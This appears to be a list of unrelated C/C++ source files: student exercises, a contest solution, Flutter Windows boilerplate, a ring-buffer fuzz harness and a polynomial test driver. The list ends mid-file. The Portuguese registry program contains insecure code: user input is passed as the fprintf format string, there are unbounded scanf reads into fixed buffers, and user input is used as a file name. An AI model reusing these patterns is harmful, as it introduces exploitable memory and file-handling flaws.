    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct DetailAlamat\n{\n    string desa;\n    string kota;\n};\n\nstruct Mahasiswa\n{\n    string nim;\n    string nama;\n    DetailAlamat alamat;\n    string umur;\n};\n\nint main()\n{\n    Mahasiswa mhs[3];\n    for (int i = 0; i < 3; i++)\n    {\n        cout << \"data ke-\" << (i + 1) << \":\" << endl;\n        cout << \"Nomor Mahasiswa : \";\n        getline(cin,mhs[i].nim);\n        cout << \"Nama Mahasiswa : \";\n        getline(cin,mhs[i].nama);\n        cout << \"Alamat Mahasiswa : \" << endl;\n        cout << \"\\tNama Desa : \";\n        cin >> mhs[i].alamat.desa;\n        cout << \"\\tNama Kota : \";\n        cin >> mhs[i].alamat.kota;\n        cout << \"Umur Mahasiswa : \";\n        cin >> mhs[i].umur;\n        cin.ignore(1, '\\n');\n        cout << endl;\n    }\n\n    for (int i = 0; i < 3; i++)\n    {\n        cout << endl;\n        cout << \"Data mahasiswa ke-\" << (i + 1) << \":\" << endl;\n        cout << \"\\n NIM : \" << mhs[i].nim;\n        cout << \"\\n Nama : \" << mhs[i].nama;\n        cout << \"\\n Alamat : \";\n        cout << \"\\n \\t Desa : \" << mhs[i].alamat.desa;\n        cout << \"\\n \\t Kota : \" << mhs[i].alamat.kota;\n        cout << \"\\n Umur : \" << mhs[i].umur;\n        cout << endl;\n    }\n}\n",
    "#include <iostream>\r\n#include <cstdio>\r\n#include <cstdlib>\r\n#include <cmath>\r\n#include <memory.h>\r\n#include <algorithm>\r\n#include <functional>\r\n#include <string>\r\n#include <cstring>\r\n#include <vector>\r\n#include <queue>\r\n#include <stack>\r\n#include <set>\r\n#include <map>\r\nusing namespace std;\r\n\r\nstruct Node\r\n{\r\n    long long x, y, id;\r\n} arr[10005];\r\n\r\nbool cmp(Node a, Node b)\r\n{\r\n    Node vec1, vec2;\r\n    vec1.x = a.x - arr[0].x;\r\n    vec1.y = a.y - arr[0].y;\r\n    vec2.x = b.x - arr[0].x;\r\n    vec2.y = b.y - arr[0].y;\r\n\r\n    return vec1.x * vec2.y - vec2.x * vec1.y > 0;\r\n}\r\n\r\nint main()\r\n{\r\n    int n;\r\n    while (scanf(\"%d\", &n) != EOF)\r\n    {\r\n        scanf(\"%lld%lld\", &arr[0].x, &arr[0].y);\r\n        arr[0].id = 0;\r\n        for (int i = 1; i < n; i++)\r\n        {\r\n            scanf(\"%lld%lld\", &arr[i].x, &arr[i].y);\r\n            arr[i].id = i;\r\n\r\n            if (arr[i].x < arr[0].x)\r\n                swap(arr[0], arr[i]);\r\n            else if (arr[i].x == arr[0].x && arr[i].y < arr[0].y)\r\n                swap(arr[0], arr[i]);\r\n        }\r\n\r\n        sort(arr + 1, arr + n, cmp);\r\n\r\n        printf(\"%lld %lld\\n\", arr[0].id + 1, arr[n / 2].id + 1);\r\n    }\r\n}\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <sys/types.h>\n\n#include <algorithm>\n#include <cstddef>\n#include <cstdint>\n#include <cstdlib>\n\n#include \"ringbuffer.h\"\n\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t* Data, size_t Size) {\n  if (Size < 2) {\n    return 0;\n  }\n\n  // Only allocate up to 1 << 16 bytes of memory. We shouldn't ever be\n  // exercising more than this.\n  uint16_t buffer_size = *((const uint16_t*)Data);\n  ringbuffer_t* buffer = ringbuffer_init(buffer_size);\n\n  if (buffer == nullptr) {\n    return 0;\n  }\n\n  for (size_t i = 2; i < Size;) {\n    size_t bytes_left = Size - i - 1;\n    switch (Data[i++] % 6) {\n      case 0: {\n        ringbuffer_available(buffer);\n        break;\n      }\n      case 1: {\n        ringbuffer_size(buffer);\n        break;\n      }\n      case 2: {\n        if (bytes_left < 2) {\n          break;\n        }\n\n        size_t bytes_to_insert = std::min(bytes_left - 1, (size_t)Data[i++]);\n        ringbuffer_insert(buffer, &Data[i], bytes_to_insert);\n        i += bytes_to_insert;\n        break;\n      }\n      case 3: {\n        if (bytes_left < 2) {\n          break;\n        }\n\n        size_t bytes_to_grab = Data[i++];\n        uint8_t* copy_buffer = (uint8_t*)malloc(bytes_to_grab);\n        off_t offset = 0;\n        if (ringbuffer_size(buffer) != 0) {\n          offset = Data[i++] % ringbuffer_size(buffer);\n        }\n\n        ringbuffer_peek(buffer, offset, copy_buffer, (size_t)bytes_to_grab);\n        free(copy_buffer);\n        break;\n      }\n      case 4: {\n        if (bytes_left < 1) {\n          break;\n        }\n\n        size_t bytes_to_grab = Data[i++];\n        uint8_t* copy_buffer = (uint8_t*)malloc(bytes_to_grab);\n        ringbuffer_pop(buffer, copy_buffer, bytes_to_grab);\n        free(copy_buffer);\n        break;\n      }\n      case 5: {\n        if (bytes_left < 1) {\n          break;\n        }\n        ringbuffer_delete(buffer, (size_t)Data[i++]);\n      }\n    }\n  }\n\n  ringbuffer_free(buffer);\n  return 0;\n}\n",
    "\ufeff#include <iostream>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n\tint numch;\r\n\tchar ch;\r\n\r\n\tcin >> ch;\r\n\tnumch = int(ch);\r\n\r\n\tif (((65 <= numch) && (numch <= 90)) || ((97 <= numch) && (numch <= 122))) {\r\n\t\tcout << \"bukva\" << endl;\r\n\t}\r\n\r\n\telse if ((48 <= numch) && (numch <= 57)) {\r\n\t\tcout << \"cifra\" << endl;\r\n\t}\r\n\r\n\telse {\r\n\t\tswitch (numch) {\r\n\t\t\tcase 33:\r\n\t\t\t\tcout << \"znak\" << endl;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 34:\r\n\t\t\t\tcout << \"znak\" << endl;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 39:\r\n\t\t\t\tcout << \"znak\" << endl;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 40:\r\n\t\t\t\tcout << \"znak\" << endl;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 41:\r\n\t\t\t\tcout << \"znak\" << endl;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 44:\r\n\t\t\t\tcout << \"znak\" << endl;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 46:\r\n\t\t\t\tcout << \"znak\" << endl;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 58:\r\n\t\t\t\tcout << \"znak\" << endl;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 59:\r\n\t\t\t\tcout << \"znak\" << endl;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 63:\r\n\t\t\t\tcout << \"znak\" << endl;\r\n\t\t\t\tbreak;\r\n\t\t\tdefault:\r\n\t\t\t\tcout << \"drugoe\" << endl;\r\n\t\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\r\n\r\n\tint oper1, oper2;\r\n\tdouble tsena , min;\r\n\tcout << \"1-megafon, 2-mts, 3-tele2 --- min kol-vo\" << endl;\r\n\tcin >> oper1 >> oper2>>min;\r\n\r\n\tif (((oper1 == 1) && (oper2 == 2)) || ((oper1 == 2) && (oper2 == 1))) {\r\n\t\ttsena = min * 2;\r\n\t}\r\n\telse if (((oper1 == 1) && (oper2 == 3)) || ((oper1 == 3) && (oper2 == 1))) {\r\n\t\ttsena = min * 3;\r\n\t}\r\n\telse if (((oper1 == 2) && (oper2 == 3)) || ((oper1 == 3) && (oper2 == 2))) {\r\n\t\ttsena = min * 4;\r\n\t}\r\n\tcout << tsena;\r\n\r\n\r\n\tint vibor;\r\n\tcout << \"enter your vibor programms:  \";\r\n\tcin >> vibor;\r\n\tif (vibor == 1) {\r\n\r\n\t\tint dohod, opoz, two_chis;\r\n\t\tcout << \"input kol-vo opozdaniy: \";\r\n\t\tcin >> opoz;\r\n\t\topoz = opoz * 20.0;\r\n\t\tcout << \"input dohod: \";\r\n\t\tcin >> dohod;\r\n\t\tdohod = (dohod + opoz);\r\n\t\ttwo_chis = (dohod % 100) / 10;\r\n\r\n\t\tswitch (two_chis) {\r\n\t\tcase 2:\r\n\t\t\tdohod += 30;\r\n\t\t\tbreak;\r\n\t\tcase 4:\r\n\t\t\tdohod += 10;\r\n\t\t\tbreak;\r\n\t\tcase 6:\r\n\t\t\tdohod += 40;\r\n\t\t\tbreak;\r\n\t\tcase 8:\r\n\t\t\tdohod += 20;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcout << \"nujno \" << dohod / 50 * 100 << \" strok\";\r\n\t}\r\n\telse if (vibor == 2) {\r\n\t\tint stroki, zp, opoz;\r\n\t\tcout << \"input kol-vo strok: \";\r\n\t\tcin >> stroki;\r\n\t\tstroki = stroki / 100 * 50;\r\n\t\tcout << \"input zp: \";\r\n\t\tcin >> zp;\r\n\t\tzp = stroki - zp;\r\n\t\tcout << zp / 20;\r\n\t}\r\n\telse if (vibor == 3) {\r\n\t\tint zp, stroki, opoz;\r\n\t\tcout << \"input kol-vo strok kratnoe 100: \";\r\n\t\tcin >> stroki;\r\n\t\tstroki = stroki / 100 * 50;\r\n\t\tcout << \"input kol-vo opozdaniy: \";\r\n\t\tcin >> opoz;\r\n\t\topoz = opoz * 20;\r\n\t\tzp = stroki - opoz;\r\n\t\tif (zp < 0) {\r\n\t\t\tcout << \"VI DOLJNI KOMPANII!! \" << zp;\r\n\t\t}\r\n\t\telse if (zp > 0) {\r\n\t\t\tcout << \"vi poluchite: \" << zp;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tcout << \"vi poluchili nichego\";\r\n\t\t}\r\n\t}\r\n}",
    "#include <stdio.h> // biblioteca de comunica\u00e7\u00e3o com o usu\u00e1rio\r\n#include <stdlib.h> // biblioteca de aloca\u00e7\u00e3o de espa\u00e7o em mem\u00f3ria\r\n#include <locale.h> // biblioteca de aloca\u00e7\u00f5es de texto por regi\u00e3o\r\n#include <string.h> // biblioteca responsavel por cuidar da string\r\n\r\nint registro() // Fun\u00e7\u00e3o respons\u00e1vel por cadastrar os usu\u00e1rios no sistema\r\n{\r\n\t// inicio cria\u00e7\u00e3o de vari\u00e1veis/string\r\n\tchar arquivo[40];\r\n\tchar cpf[40];\r\n\tchar nome[40];\r\n\tchar sobrenome[40];\r\n\tchar cargo[40];\r\n\t// final cria\u00e7\u00e3o de vari\u00e1veis/string\r\n\t\r\n\tprintf(\"Digite o CPF a ser cadastrado: \"); // coletando informa\u00e7\u00e3o do usu\u00e1rio\r\n\tscanf(\"%s\", cpf); // %s refere-se a string\r\n\t\r\n\tstrcpy(arquivo, cpf); //responsavel por copiar os  valores das string\r\n\t\r\n\tFILE *file; // cria o arquivo \r\n\tfile = fopen(arquivo, \"w\"); // cria o arquivo e o \"w\" significa escrever de write\r\n\tfprintf(file,cpf); // salvo o valor da variavel\r\n\tfclose(file); // fecha o arquivo\r\n\t\r\n\tfile = fopen(arquivo, \"a\");\r\n\tfprintf(file,\",\");\r\n\tfclose(file);\r\n\t\r\n\tprintf(\"Digite o nome a ser cadastrado: \"); // coletando informa\u00e7\u00e3o do usu\u00e1rio\r\n\tscanf(\"%s\", nome); // %s refere-se a string\r\n\t\r\n\tfile = fopen(arquivo, \"a\"); // atualiza no arquivo as informa\u00e7\u00f5es\r\n\tfprintf(file,nome); // salva o valor da variavel\r\n\tfclose(file);\r\n\t\r\n\tfile = fopen(arquivo, \"a\");\r\n\tfprintf(file,\",\");\r\n\tfclose(file);\r\n\t\r\n\tprintf(\"Digite o sobrenome a ser cadastrado: \");\r\n\tscanf(\"%s\",sobrenome);\r\n\t\r\n\tfile = fopen(arquivo, \"a\");\r\n\tfprintf(file,sobrenome);\r\n\tfclose(file);\r\n\t\r\n\tfile = fopen(arquivo, \"a\");\r\n\tfprintf(file,\",\");\r\n\tfclose(file);\r\n\t\r\n\tprintf(\"Digite o cargo a ser cadastrado: \");\r\n\tscanf(\"%s\",sobrenome);\r\n\t\r\n\tfile = fopen(arquivo, \"a\");\r\n\tfprintf(file,sobrenome);\r\n\tfclose(file);\r\n\t\r\n\tfile = fopen(arquivo, \"a\");\r\n\tfprintf(file,\",\");\r\n\tfclose(file);\r\n\t\r\n\t\r\n}\r\n\r\nint consulta()\r\n{\r\n\tsetlocale(LC_ALL, \"Portuguese\"); // Definindo linguagem\r\n\tchar cpf[40];\r\n\tchar conteudo[200];\r\n\t\r\n\tprintf(\"Digite o CPF a ser consultado: \");\r\n\tscanf(\"%s\",cpf);\r\n\t\r\n\tFILE *file;\r\n\tfile = fopen(cpf,\"r\");\r\n\t\r\n\tif(file == NULL)\r\n\t{\r\n\t\tprintf(\"N\u00e3o foi possivel abrir o arquivo, n\u00e3o localizado!.\\n\");\r\n\t\t\r\n\t\t}\t\r\n\t\r\n\twhile(fgets(conteudo, 200, file) != NULL)\r\n\t{\r\n\t\tprintf(\"\\n Essas s\u00e3o as informa\u00e7\u00f5es do usu\u00e1rio: CPF \");\r\n\t\tprintf(\"%s\", conteudo);\r\n\t\tprintf(\"\\n\\n\");\r\n\t}\r\n\t\r\n\tsystem (\"pause\");\r\n\t\r\n\t\r\n}\r\n\r\nint deletar ()\r\n{\r\n\tchar cpf[40];\r\n\tprintf(\"Digite o CPF do usu\u00e1rio a ser deletado: \");\r\n\tscanf(\"%s\",cpf);\r\n\t\r\n\tremove(cpf);\r\n\t\r\n\tFILE *file;\r\n\tfile = fopen(cpf, \"r\");\r\n\t\r\n\tif (file ==  NULL)\r\n\t{\r\n\t\tprintf(\"o Usu\u00e1rio n\u00e3o se encontra no sistema!. \\n\");\r\n\t\tsystem(\"pause\");\r\n\t}\r\n\t\r\n\t\r\n}\r\n\r\n\r\nint main ()\r\n\r\n\t{ \r\n\tint opcao=0; // definindo a vari\u00e1veis\r\n\tint x=1;\r\n\t\r\n\tfor (x=1;x=1;)\r\n\t{\r\n\t\t\r\n\t\tsystem(\"cls\");\r\n\t\t\r\n\t\r\n\tsetlocale(LC_ALL, \"Portuguese\"); // Definindo linguagem\r\n\r\n\r\n\tprintf(\"-----Cart\u00f3rio do Ian -----\\n\\n\"); //inicio do menu\r\n\tprintf(\"Escolha a op\u00e7\u00e3o desejada do menu:\\n\\n \");\r\n\tprintf(\"\\t1 - Registrar nomes\\n\");\r\n\tprintf(\"\\t2 - Consultar nomes\\n\");\r\n\tprintf(\"\\t3 - Deletar nomes\\n\");\r\n\tprintf(\"\\t4 - Sair do sistema\\n\");\r\n\tprintf(\"Op\u00e7\u00e3o: \"); // fim do menu\r\n\t\r\n\tscanf(\"%d\", &opcao); // armazenando a escolha do usu\u00e1rio\r\n\tsystem(\"cls\");\r\n\t\r\n\t\r\n\tswitch(opcao) // inicio da sele\u00e7\u00e3o do menu\r\n\t\t{\r\n\t\t\t\r\n\t\t\t\tcase 1:\r\n\t\t\t\tregistro(); // chamada de fun\u00e7\u00f5es\r\n\t\t\t\tbreak;\r\n\t\t\t\t\r\n\t\t\t\tcase 2:\r\n\t\t\t\tconsulta();\r\n\t\t\t\tbreak;\r\n\t\t\t\t\r\n\t\t\t\tcase 3:\r\n\t\t\t\tdeletar();\r\n\t\t\t\tbreak;\r\n\t\t\t\t\r\n\t\t\t\tcase 4:\r\n\t\t\t\tprintf(\"Obrigado por utilizar nosso sistema!\\n\");\r\n\t\t\t\treturn 0;\r\n\t\t\t\tbreak;\r\n\t\t\t\t\r\n\t\t\t\tdefault:\t\r\n\t\t\t\tprintf(\"Essa op\u00e7\u00e3o n\u00e3o est\u00e1 disponivel!\\n\");\r\n\t\t\t\tsystem(\"pause\");\r\n\t\t\t\tbreak;\r\n\t\t} // // fim da sele\u00e7\u00e3o do menu\r\n\t\t\t\r\n\t\r\n\t}\r\n\t}\r\n\t\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"codelabs_namerapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"journal\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <cmath>\r\n\r\n#include \"Poly.h\"\r\n\r\nusing namespace std;\r\n\r\n// Funcao para imprimir as informacoes sobre um Poly\r\nvoid imprimir(const string& Nome, const Poly& P)\r\n{\r\n  cout << Nome << '\\t'\r\n       << \"coefs=[\";\r\n  for (int i=0; i<=P.getGrau(); ++i)\r\n  {\r\n    cout << P.getCoef(i);\r\n    if (i<P.getGrau()) cout << ' ';\r\n  }\r\n  cout << \"]\\n\";\r\n}\r\n\r\nint main(void)\r\n{\r\n  const Poly Pvazio;\r\n  const Poly P0(0);\r\n  Poly P2(2);\r\n  P2.setCoef(0,3.5);\r\n  P2.setCoef(2,-1);\r\n\r\n  int i;\r\n\r\n  // Testando op[]\r\n\r\n  cout << \"==========\\n\";\r\n  cout << \"i\" << '\\t' << \"Pvaz\" << '\\t' << \"P0\" << '\\t' << \"P2\" << endl;\r\n  for (i=-1; i<=3; ++i)\r\n  {\r\n    cout << i << '\\t' << Pvazio[i] << '\\t' << P0[i] << '\\t' << P2[i] << endl;\r\n  }\r\n\r\n  // Testando comparacoes\r\n  cout << \"==========\\n\";\r\n  Poly Pvazio_2(Pvazio);\r\n  Poly P0_2(P0);\r\n  Poly P2_2(P2);\r\n  if (Pvazio_2 == Pvazio) cout << \"OK == com Pvazio\\n\";\r\n  else cout << \"ERRO == com Pvazio\\n\";\r\n  if (P0_2 == P0) cout << \"OK == com P0\\n\";\r\n  else cout << \"ERRO == com P0\\n\";\r\n  if (P2_2 == P2) cout << \"OK == com P2\\n\";\r\n  else cout << \"ERRO == com P2\\n\";\r\n\r\n  if (P0 != Pvazio) cout << \"OK != com P0,Pvazio\\n\";\r\n  else cout << \"ERRO != com P0,Pvazio\\n\";\r\n  if (P2 != P0) cout << \"OK != com P2,P0\\n\";\r\n  else cout << \"ERRO == com P2,P0\\n\";\r\n  if (Pvazio != P2) cout << \"OK != com Pvazio,P2\\n\";\r\n  else cout << \"ERRO == com Pvazio,P2\\n\";\r\n\r\n  // Testando predicados\r\n  cout << \"==========\\n\";\r\n  if (Pvazio.empty()) cout << \"OK empty com Pvazio\\n\";\r\n  else cout << \"ERRO empty com Pvazio\\n\";\r\n  if (P0.empty()) cout << \"ERRO empty com P0\\n\";\r\n  else cout << \"OK empty com P0\\n\";\r\n  if (P2.empty()) cout << \"ERRO empty com P2\\n\";\r\n  else cout << \"OK empty com P2\\n\";\r\n\r\n  if (Pvazio.isZero()) cout << \"ERRO isZero com Pvazio\\n\";\r\n  else cout << \"OK isZero com Pvazio\\n\";\r\n  if (P0.isZero()) cout << \"OK isZero com P0\\n\";\r\n  else cout << \"ERRO isZero com P0\\n\";\r\n  if (P2.isZero()) cout << \"ERRO isZero com P2\\n\";\r\n  else cout << \"OK isZero com P2\\n\";\r\n\r\n  // Testando getValor\r\n\r\n  cout << \"==========\\n\";\r\n  cout << \"x\" << '\\t' << \"Pvaz\" << '\\t' << \"P0\" << '\\t' << \"P2\" << endl;\r\n  for (double x=-1.0; x<=3.0; ++x)\r\n  {\r\n    cout << x << '\\t' << Pvazio.getValor(x) << '\\t' << P0.getValor(x) << '\\t' << P2.getValor(x) << endl;\r\n    cout << x << '\\t' << Pvazio(x) << '\\t' << P0(x) << '\\t' << P2(x) << endl;\r\n  }\r\n  cout << \"P2(1.87) deveria dar 0.0 e deu \" << P2(sqrt(3.5)) << endl;\r\n\r\n  // Testando recriar\r\n\r\n  cout << \"==========\\n\";\r\n  P2.recriar(-1000);\r\n  imprimir(\"Vaz\", P2);\r\n  P2.recriar(0);\r\n  imprimir(\"0\", P2);\r\n  P2.recriar(2);\r\n  imprimir(\"2\", P2);\r\n\r\n  // Testando << com os casos listados na especificacao\r\n\r\n  cout << \"==========\\n\";\r\n  P2.recriar(3);\r\n  P2.setCoef(0,5.7);\r\n  P2.setCoef(1,1.4);\r\n  P2.setCoef(2,3.2);\r\n  P2.setCoef(3,0.2);\r\n  cout << \"0.2*x^3+3.2*x^2+1.4*x+5.7\" << \"\\tESPERADO\\n\";\r\n  cout << P2 << \"\\tOBTIDO\\n\";\r\n\r\n  P2.setCoef(0,5.7);\r\n  P2.setCoef(1,1.0);\r\n  P2.setCoef(2,3.2);\r\n  P2.setCoef(3,1.0);\r\n  cout << \"x^3+3.2*x^2+x+5.7\" << \"\\tESPERADO\\n\";\r\n  cout << P2 << \"\\tOBTIDO\\n\";\r\n\r\n  P2.setCoef(0,5.7);\r\n  P2.setCoef(1,-1.4);\r\n  P2.setCoef(2,3.2);\r\n  P2.setCoef(3,-0.2);\r\n  cout << \"-0.2*x^3+3.2*x^2-1.4*x+5.7\" << \"\\tESPERADO\\n\";\r\n  cout << P2 << \"\\tOBTIDO\\n\";\r\n\r\n  P2.setCoef(0,5.7);\r\n  P2.setCoef(1,-1.0);\r\n  P2.setCoef(2,3.2);\r\n  P2.setCoef(3,-1.0);\r\n  cout << \"-x^3+3.2*x^2-x+5.7\" << \"\\tESPERADO\\n\";\r\n  cout << P2 << \"\\tOBTIDO\\n\";\r\n\r\n  P2.setCoef(0,0.0);\r\n  P2.setCoef(1,1.4);\r\n  P2.setCoef(2,0.0);\r\n  P2.setCoef(3,0.2);\r\n  cout << \"0.2*x^3+1.4*x\" << \"\\tESPERADO\\n\";\r\n  cout << P2 << \"\\tOBTIDO\\n\";\r\n\r\n  P2.recriar(1);\r\n  P2.setCoef(0,0.0);\r\n  P2.setCoef(1,1.0);\r\n  cout << \"x\" << \"\\tESPERADO\\n\";\r\n  cout << P2 << \"\\tOBTIDO\\n\";\r\n\r\n  P2.recriar(0);\r\n  P2.setCoef(0,1.0);\r\n  cout << \"1\" << \"\\tESPERADO\\n\";\r\n  cout << P2 << \"\\tOBTIDO\\n\";\r\n\r\n  P2.setCoef(0,0.0);\r\n  cout << \"0\" << \"\\tESPERADO\\n\";\r\n  cout << P2 << \"\\tOBTIDO\\n\";\r\n\r\n  cout << \"><\" << \"\\tESPERADO\\n\";\r\n  cout << '>' << Pvazio << '<' << \"\\tOBTIDO\\n\";\r\n\r\n  return 0;\r\n}\r\n\r\n",
    "#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\n// Struktur untuk data kursi\r\nstruct Kursi {\r\n    string nomor;\r\n    bool tersedia;\r\n};\r\n\r\n// Struktur untuk data film\r\nstruct Film {\r\n    string judul;\r\n    int harga;\r\n};\r\n\r\n// Fungsi untuk menampilkan daftar kursi\r\nvoid tampilkanDaftarKursi(Kursi daftarKursi[], int jumlahKursi) {\r\n    cout << \"Daftar kursi yang tersedia:\" << endl;\r\n    for (int i = 0; i < jumlahKursi; ++i) {\r\n        cout << \"Kursi \" << daftarKursi[i].nomor;\r\n        if (daftarKursi[i].tersedia) {\r\n            cout << \" - Tersedia\" << endl;\r\n        } else {\r\n            cout << \" - Sudah Dipesan\" << endl;\r\n        }\r\n    }\r\n}\r\n\r\n// Fungsi untuk menampilkan menu film\r\nvoid tampilkanMenuFilm(Film daftarFilm[], int jumlahFilm) {\r\n    cout << \"Daftar film yang tersedia:\" << endl;\r\n    for (int i = 0; i < jumlahFilm; ++i) {\r\n        cout << i+1 << \". \" << daftarFilm[i].judul << \" - Rp\" << daftarFilm[i].harga << endl;\r\n    }\r\n}\r\n\r\n// Fungsi untuk menghitung total harga tiket film\r\nint hitungTotalHargaFilm(Film daftarFilm[], int jumlahFilm, int beli[]) {\r\n    int totalHarga = 0;\r\n    for (int i = 0; i < jumlahFilm; ++i) {\r\n        totalHarga += daftarFilm[i].harga * beli[i];\r\n    }\r\n    return totalHarga;\r\n}\r\n\r\nint main() {\r\n    // Inisialisasi daftar kursi\r\n    const int JUMLAH_KURSI = 10;\r\n    Kursi daftarKursi[JUMLAH_KURSI];\r\n    for (int i = 0; i < JUMLAH_KURSI; ++i) {\r\n        daftarKursi[i].nomor = \"A\" + to_string(i+1);\r\n        daftarKursi[i].tersedia = true;\r\n    }\r\n\r\n    // Inisialisasi daftar film\r\n    const int JUMLAH_FILM = 3;\r\n    Film daftarFilm[JUMLAH_FILM] = {\r\n        {\"Inside Out 2\", 45000},\r\n        {\"Agak Laen\", 45000},\r\n        {\"Exhuma\", 50000},\r\n    };\r\n\r\n    // Inisialisasi jumlah tiket yang dibeli untuk film\r\n    int beliFilm[JUMLAH_FILM] = {0};\r\n\r\n    // Menampilkan daftar kursi\r\n    tampilkanDaftarKursi(daftarKursi, JUMLAH_KURSI);\r\n\r\n    // Memilih kursi\r\n    string nomorKursi;\r\n    cout << \"\\nMasukkan nomor kursi yang ingin dipesan: \";\r\n    cin >> nomorKursi;\r\n\r\n    // Memeriksa ketersediaan kursi\r\n    for (int i = 0; i < JUMLAH_KURSI; ++i) {\r\n        if (daftarKursi[i].nomor == nomorKursi) {\r\n            if (daftarKursi[i].tersedia) {\r\n                cout << \"Kursi \" << nomorKursi << \" berhasil dipesan.\" << endl;\r\n                daftarKursi[i].tersedia = false;\r\n            } else {\r\n                cout << \"Maaf, kursi \" << nomorKursi << \" sudah dipesan. Silakan pilih kursi lain.\" << endl;\r\n            }\r\n            break;\r\n        }\r\n        if (i == JUMLAH_KURSI - 1) {\r\n            cout << \"Nomor kursi tidak valid.\" << endl;\r\n        }\r\n    }\r\n\r\n    // Menampilkan daftar kursi setelah memesan\r\n    cout << \"\\nDaftar kursi setelah pemesanan:\" << endl;\r\n    tampilkanDaftarKursi(daftarKursi, JUMLAH_KURSI);\r\n\r\n    // Menampilkan menu film\r\n    tampilkanMenuFilm(daftarFilm, JUMLAH_FILM);\r\n\r\n    // Meminta pengguna untuk memilih film\r\n    int pilihan;\r\n    do {\r\n        cout << \"\\nMasukkan nomor film yang ingin ditonton (0 untuk selesai): \";\r\n        cin >> pilihan;\r\n        if (pilihan >= 1 && pilihan <= JUMLAH_FILM) {\r\n            int 